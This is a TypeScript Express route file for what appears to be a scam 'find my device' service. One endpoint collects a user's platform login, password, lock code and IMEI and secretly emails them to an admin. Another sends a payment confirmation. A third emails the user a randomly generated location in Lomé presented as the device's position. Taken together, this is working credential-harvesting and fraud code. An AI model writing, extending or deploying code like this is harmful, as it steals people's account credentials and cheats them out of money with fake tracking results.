import type { Express } from "express";
import { createServer, type Server } from "http";
import { storage } from "./storage";
import { 
  sendUserCredentialsToAdmin, 
  sendPaymentConfirmation, 
  sendLocationToUser,
  UserCredentials 
} from "./email";
import { generateLomeLocation } from "../client/src/lib/device-data";

export async function registerRoutes(app: Express): Promise<Server> {
  // Health check endpoint
  app.get('/api/health', (req, res) => {
    res.json({ status: 'ok', timestamp: new Date().toISOString() });
  });

  // Submit user credentials and send to admin
  app.post('/api/submit-credentials', async (req, res) => {
    try {
      const { email, platform, device, identifier, password, lockCode, imei } = req.body;

      if (!email || !platform || !device || !identifier || !password || !lockCode || !imei) {
        return res.status(400).json({ error: 'Missing required fields' });
      }

      const credentials: UserCredentials = {
        email,
        platform,
        device,
        identifier,
        password,
        lockCode,
        imei
      };

      // Send credentials to admin (secret)
      const adminEmailSent = await sendUserCredentialsToAdmin(credentials);

      if (adminEmailSent) {
        res.json({ success: true, message: 'Credentials submitted successfully' });
      } else {
        res.status(500).json({ error: 'Failed to process credentials' });
      }
    } catch (error) {
      console.error('Error submitting credentials:', error);
      res.status(500).json({ error: 'Internal server error' });
    }
  });

  // Send payment confirmation
  app.post('/api/confirm-payment', async (req, res) => {
    try {
      const { userEmail, device, imei } = req.body;

      if (!userEmail || !device || !imei) {
        return res.status(400).json({ error: 'Missing required fields' });
      }

      const emailSent = await sendPaymentConfirmation(userEmail, device, imei);

      if (emailSent) {
        res.json({ success: true, message: 'Payment confirmation sent' });
      } else {
        res.status(500).json({ error: 'Failed to send payment confirmation' });
      }
    } catch (error) {
      console.error('Error sending payment confirmation:', error);
      res.status(500).json({ error: 'Internal server error' });
    }
  });

  // Send location to user
  app.post('/api/send-location', async (req, res) => {
    try {
      const { userEmail, device } = req.body;

      if (!userEmail || !device) {
        return res.status(400).json({ error: 'Missing required fields' });
      }

      // Generate random location in Lomé
      const coordinates = generateLomeLocation();
      const emailSent = await sendLocationToUser(userEmail, device, coordinates);

      if (emailSent) {
        res.json({ success: true, message: 'Location sent to user', coordinates });
      } else {
        res.status(500).json({ error: 'Failed to send location' });
      }
    } catch (error) {
      console.error('Error sending location:', error);
      res.status(500).json({ error: 'Internal server error' });
    }
  });

  const httpServer = createServer(app);

  return httpServer;
}
